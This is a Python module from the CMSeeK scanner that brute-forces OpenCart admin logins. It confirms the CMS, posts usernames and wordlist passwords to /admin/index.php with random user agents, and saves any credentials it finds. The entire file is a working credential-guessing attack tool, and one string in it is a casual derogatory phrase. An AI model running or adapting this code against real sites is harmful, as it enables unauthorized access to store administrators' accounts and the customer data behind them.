#!/usr/bin/python3
# -*- coding: utf-8 -*-
# This is a part of CMSeeK, check the LICENSE file for more information
# Copyright (c) 2018 - 2020 Tuhinshubhra
### OpenCart Bruteforce module
### Version 1.0
### cmseekbruteforcemodule <- make sure you include this comment in any custom modules you create so that cmseek can recognize it as a part of it's module

import cmseekdb.basic as cmseek
import cmseekdb.sc as source # Contains function to detect cms from source code
import cmseekdb.header as header # Contains function to detect CMS from gathered http headers
import multiprocessing ## Let's speed things up a lil bit (actually a hell lot faster) shell we?
from functools import partial ## needed somewhere :/
import sys
import cmseekdb.generator as generator
import urllib.request


def testlogin(url,user,passw,):
    url = url + '/admin/index.php'
    ua = cmseek.randomua('generatenewuaeverytimetobesafeiguess')
    try:
        ckreq = urllib.request.Request(
        url,
        data=urllib.parse.urlencode({'username':user, 'password':passw}).encode("utf-8"),
        headers={
            'User-Agent': ua
        }
        )
        with urllib.request.urlopen(ckreq, timeout=4) as response:
            scode = response.read().decode()
            headers = str(response.info())
            rurl = response.geturl()
            r = ['1', scode, headers, rurl] ## 'success code', 'source code', 'http headers'
            return r
    except Exception as e:
        e = str(e)
        r = ['2', e, '', ''] ## 'error code', 'error message', 'empty'
        return r
    print('hola')


def start():
    cmseek.clearscreen()
    cmseek.banner("OpenCart Bruteforce Module")
    url = cmseek.targetinp("") # input('Enter Url: ')
    cmseek.info("Checking for OpenCart")
    bsrc = cmseek.getsource(url, cmseek.randomua('foodislove'))
    if bsrc[0] != '1':
        cmseek.error("Could not get target source, CMSeek is quitting")
        cmseek.handle_quit()
    else:
        ## Parse generator meta tag
        parse_generator = generator.parse(bsrc[1])
        ga = parse_generator[0]
        ga_content = parse_generator[1]

        try1 = generator.scan(ga_content)
        if try1[0] == '1' and try1[1] == 'oc':
            occnf = '1'
        else:
            try2 = source.check(bsrc[1], url)
            if try2[0] == '1' and try2[1] == 'oc':
                occnf = '1'
            else:
                occnf = '0'
    if occnf != '1':
        cmseek.error('Could not confirm OpenCart... CMSeek is quitting')
        cmseek.handle_quit()
    else:
        cmseek.success("OpenCart Confirmed... Checking for OpenCart login form")
        ocloginsrc = cmseek.getsource(url + '/admin/index.php', cmseek.randomua('thatsprettygay'))
        if ocloginsrc[0] == '1' and '<form' in ocloginsrc[1] and 'route=common/login' in ocloginsrc[1]:
            cmseek.success("Login form found!")
            ocparamuser = ['']
            rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
            for rusr in rawuser:
                ocparamuser.append(rusr)
            ocbruteusers = set(ocparamuser) ## Strip duplicate usernames

            for user in ocbruteusers:
                if user != '':
                    passfound = '0'
                    print('\n')
                    cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
                    pwd_file = open("wordlist/passwords.txt", "r")
                    passwords = pwd_file.read().split('\n')
                    passwords.insert(0, user)
                    for password in passwords:
                        if password != '' and password != '\n':
                            sys.stdout.write('[*] Testing Password: ')
                            sys.stdout.write('%s\r\r' % password)
                            sys.stdout.flush()
                            cursrc = testlogin(url, user, password)
                            if 'route=common/dashboard&user_token=' in str(cursrc[3]):
                                cmseek.success('Password found!')
                                print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
                                cmseek.success('Enjoy The Hunt!')
                                cmseek.savebrute(url,url + '/admin/index.php',user,password)
                                passfound = '1'
                                break
                            else:
                                continue
                            break
                    if passfound == '0':
                        cmseek.error('\n\nCould Not find Password!')
                    print('\n\n')

        else:
            cmseek.error("Couldn't find login form... CMSeeK is quitting")
            cmseek.handle_quit()
